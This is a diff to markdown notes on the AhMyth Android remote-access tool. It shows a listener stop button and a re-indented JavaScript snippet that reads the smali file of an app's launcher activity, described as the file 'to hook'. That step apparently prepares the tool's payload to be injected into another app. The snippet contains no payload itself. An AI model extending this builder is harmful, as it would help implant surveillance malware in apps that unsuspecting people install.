@@ -167,16 +167,16 @@ Stop function for the AhMyth Listener | index.html = Line 69 |
 <button ng-click="isListen=false;Stop(port);" class="ui labeled icon black button"><i class="terminal icon" ></i>Stop</button>
 ```
 
-code utilising `shelljs` from npm to find the correct launcher activity
+code utilising `unix "find"` command to find the correct launcher activity
 ```javascript
-var smaliPath = stdout.substring(stdout.indexOf('./') + 2);
-$appCtrl.Log("smali File to hook " + smaliPath); // this returns full path of smali file from apkfolder, need to implement it for launcherPath var
-$appCtrl.Log();
-fs.readFile(path.join(smaliPath), 'utf8', (error, data) => {
-    if (error) {
-        $appCtrl.Log('Reading Launcher Activity Failed', CONSTANTS.logStatus.FAIL);
-        $appCtrl.Log();
-        return;
-    }
-  });
+                    var smaliPath = stdout.substring(stdout.indexOf('./') + 2);
+                    $appCtrl.Log("smali File to hook: " + smaliPath); // this returns full path of smali file from apkfolder, need to implement it for launcherPath var
+                    $appCtrl.Log();
+                    fs.readFile(smaliPath, 'utf8', (error, data) => {
+                        if (error) {
+                            $appCtrl.Log('Reading Launcher Activity Failed', CONSTANTS.logStatus.FAIL);
+                            $appCtrl.Log();
+                            return;
+                        }
+                      });
 ``` 
